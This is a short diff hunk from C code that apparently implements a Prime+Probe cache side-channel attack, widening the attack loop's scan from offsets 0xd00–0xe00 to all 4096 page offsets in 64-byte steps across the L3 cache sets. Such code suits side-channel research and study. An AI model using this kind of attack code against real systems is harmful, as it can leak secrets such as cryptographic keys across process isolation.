@@ -245,8 +245,8 @@ static void attack(cachemap_t cm) {
   pp_t *pps[256];
 
   int found = 0;
-  //for (int offset = 0; offset < 4096; offset += 64) {
-  for (int offset = 0xd00; offset < 0xe00; offset += 64) {
+  for (int offset = 0; offset < 4096; offset += 64) {
+  //for (int offset = 0xd00; offset < 0xe00; offset += 64) {
     for (int i = 0; i < cm->nsets; i++)
       pps[i] = pp_prepare(cm->sets[i], L3_ASSOCIATIVITY, offset);
     printf("Trying offset 0x%03x\n", offset);
